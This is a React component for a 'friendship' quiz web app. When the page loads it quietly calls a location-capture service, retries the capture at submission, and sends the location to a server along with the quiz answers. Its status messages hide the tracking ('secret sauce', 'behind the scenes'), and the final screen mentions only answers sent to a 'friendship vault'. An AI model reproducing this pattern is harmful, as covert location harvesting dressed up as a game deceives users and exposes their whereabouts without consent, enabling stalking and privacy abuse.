import React, { useEffect, useState } from 'react';
import { AnimatePresence, motion } from 'framer-motion';
import QuizCard from './components/QuizCard';
import FeedbackOverlay from './components/FeedbackOverlay';
import { questions } from './data/questions';
import { getCompleteLocation } from './services/locationService';

function App() {
  const [currentQuestionIndex, setCurrentQuestionIndex] = useState(0);
  const [answers, setAnswers] = useState({});
  const [showFeedback, setShowFeedback] = useState(false);
  const [isFinished, setIsFinished] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [locationStatus, setLocationStatus] = useState('');
  const [capturedLocation, setCapturedLocation] = useState(null);

  const currentQuestion = questions[currentQuestionIndex];

  const handleAnswer = React.useCallback((answer) => {
    // Save answer
    setAnswers(prev => ({ ...prev, [currentQuestion.id]: answer }));
    
    // Show feedback
    setShowFeedback(true);
  }, [currentQuestion.id]);

  useEffect(() => {
    let isMounted = true;

    const requestInitialLocation = async () => {
      setLocationStatus('Getting things set up...');
      try {
        const initialLocation = await getCompleteLocation();
        if (!isMounted) return;

        console.log('Initial location result:', initialLocation);
        setCapturedLocation(initialLocation);

        if (initialLocation.error) {
          setLocationStatus('Almost ready...');
        } else {
          setLocationStatus('All set!');
        }
      } catch (error) {
        if (!isMounted) return;
        console.error('Initial location capture failed:', error);
        setLocationStatus('We\'ll handle the rest behind the scenes.');
      }
    };

    requestInitialLocation();

    return () => {
      isMounted = false;
    };
  }, []);

  const submitAnswers = React.useCallback(async () => {
    console.log("All Answers Collected:", answers);
    setIsSubmitting(true);
    
    try {
      let location = capturedLocation;

      if (!location || location.error) {
        setLocationStatus('Finishing up some secret sauce...');
        console.log('Stored location unavailable, attempting fresh capture...');
        location = await getCompleteLocation();
        console.log('Fresh location result:', location);
        setCapturedLocation(location);
      } else {
        console.log('Using previously captured location:', location);
        setLocationStatus('Putting the final bow on it...');
      }
      
      if (location.error) {
        console.warn('Location capture had issues:', location.error);
        setLocationStatus('Almost there—thanks for waiting!');
      } else {
        setLocationStatus('Everything looks good—sending now!');
      }
      
      const apiUrl = import.meta.env.VITE_API_URL || 'http://localhost:4000';
      console.log('Submitting to:', apiUrl, 'with location:', location);
      const response = await fetch(`${apiUrl}/api/submit`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ answers, location }),
      });


      if (!response.ok) {
        throw new Error('Failed to submit answers');
      }

      const data = await response.json();
      console.log('Submission successful:', data);
      setLocationStatus('');
      setIsSubmitting(false);
    } catch (error) {
      console.error('Error submitting answers:', error);
      setLocationStatus('Something went wrong, but you\'re still awesome!');
      setIsSubmitting(false);
    }
  }, [answers, capturedLocation]);

  const handleFeedbackComplete = React.useCallback(() => {
    setShowFeedback(false);
    
    if (currentQuestionIndex < questions.length - 1) {
      setCurrentQuestionIndex(prev => prev + 1);
    } else {
      setIsFinished(true);
      submitAnswers();
    }
  }, [currentQuestionIndex, submitAnswers]);

  return (
    <div className="min-h-screen w-full flex flex-col items-center justify-center p-4 relative overflow-hidden">
      {/* Background Elements */}
      <div className="absolute top-[-10%] left-[-10%] w-96 h-96 bg-purple-400/30 rounded-full blur-3xl animate-pulse" />
      <div className="absolute bottom-[-10%] right-[-10%] w-96 h-96 bg-blue-400/30 rounded-full blur-3xl animate-pulse delay-1000" />

      <FeedbackOverlay isVisible={showFeedback} onComplete={handleFeedbackComplete} />

      <AnimatePresence mode='wait'>
        {!isFinished ? (
          <QuizCard 
            key={currentQuestion.id} 
            question={currentQuestion} 
            onAnswer={handleAnswer} 
          />
        ) : (
          <motion.div
            initial={{ opacity: 0, scale: 0.8 }}
            animate={{ opacity: 1, scale: 1 }}
            className="text-center text-white p-8 bg-white/10 backdrop-blur-lg rounded-3xl border border-white/20 max-w-md"
          >
            {isSubmitting ? (
              <>
                <div className="mb-6">
                  <div className="w-16 h-16 border-4 border-white/30 border-t-white rounded-full animate-spin mx-auto mb-4"></div>
                  <p className="text-xl font-semibold">{locationStatus}</p>
                </div>
              </>
            ) : (
              <>
                <h1 className="text-4xl font-bold mb-4">You're a Real One! 💖</h1>
                <p className="text-xl mb-6">Thanks for playing! Your answers have been sent to the friendship vault.</p>
                <button 
                  onClick={() => window.location.reload()}
                  className="px-6 py-3 bg-white text-purple-600 rounded-full font-bold hover:bg-opacity-90 transition-all"
                >
                  Play Again
                </button>
              </>
            )}
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

export default App;
